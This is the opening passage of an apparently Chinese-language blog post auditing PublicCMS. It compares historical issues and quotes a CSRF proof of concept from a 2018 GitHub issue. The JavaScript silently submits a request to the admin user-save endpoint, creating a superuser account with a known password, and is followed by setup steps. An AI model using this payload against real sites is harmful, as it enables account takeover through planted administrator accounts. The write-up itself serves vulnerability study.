---
title: PublicCMS代码审计及版本对比分析
tags:
  - java安全
  - 代码安全
  - 代码审计
categories: 代码安全
---





## 简介

项目地址：https://github.com/sanluan/PublicCMS

看一下issus发现很多漏洞，我们一个一个看。





## 历史漏洞对比分析

### CSRF

isssue提交日期：2018-5-25，地址：https://github.com/sanluan/PublicCMS/issues/11

poc

```
<html>
  <!-- CSRF PoC  -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/127.0.0.1:8080\/publiccms\/admin\/sysUser\/save.do?callbackType=closeCurrent&navTabId=sysUser\/list", true);
        xhr.setRequestHeader("Accept", "application\/json, text\/javascript, *\/*; q=0.01");
        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8");
        xhr.withCredentials = true;
        var body = "id=&name=testvul&superuserAccess=on&deptId=1&deptName=%E6%8A%80%E6%9C%AF%E9%83%A8&password=123456&repassword=123456&nickName=testvul&email=test%40gmail.com&roleIds=1";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
```

分别下载PublicCMS1.0和PublicCMS-2016

创建数据库

```
create database publiccms DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
```

